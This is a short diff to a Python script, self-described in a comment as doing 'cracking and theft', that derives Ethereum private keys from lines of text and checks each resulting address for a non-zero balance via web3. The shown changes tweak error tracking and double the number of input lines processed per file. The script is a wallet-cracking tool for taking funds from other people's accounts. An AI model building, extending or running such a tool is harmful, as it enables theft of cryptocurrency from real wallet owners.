@@ -168,7 +168,7 @@ def generateAddress(entropy):
 	return pubKey, privKey
 
 # The actual cracking and theft
-def findANonZeroBalance(entropy):
+def findANonZeroBalance(entropy, i):
 	# Create a wallet
 	pubKey, privKey = generateAddress(entropy)
 	if (verbosity >= VERBOSITY_HIGH):
@@ -180,7 +180,7 @@ def findANonZeroBalance(entropy):
 		balance = web3Instance.eth.get_balance(pubKey)
 	except Exception as e:
 		print(e)
-		loadbalance.addErr()
+		loadbalance.addErr(i)
 		pass
 	
 	# Save relevant data
@@ -241,7 +241,7 @@ def main():
 			print("[ERROR] Unknown issue opening file \'" + str(sourceFile) + "\', moving to next file ... ")
 			continue
 		i = 0
-		for textLine in lines[0:20]:
+		for textLine in lines[0:40]:
 			print(i)
 			i += 1
 			# Get the line from the file and format it for our Ethereum tools
@@ -258,7 +258,8 @@ def main():
 			entropyList = permutate.generateEntropies(tempLine)
 			for entropy in entropyList:
 				loadbalance.loadBalance()
-				findANonZeroBalance(entropy)
+				findANonZeroBalance(entropy, i)
+		# loadbalance.printErr()
 				
 	print("[INFO] Keygen complete, keypair details are located at:\n\t\'" + dbFileLocation + "\'")
 
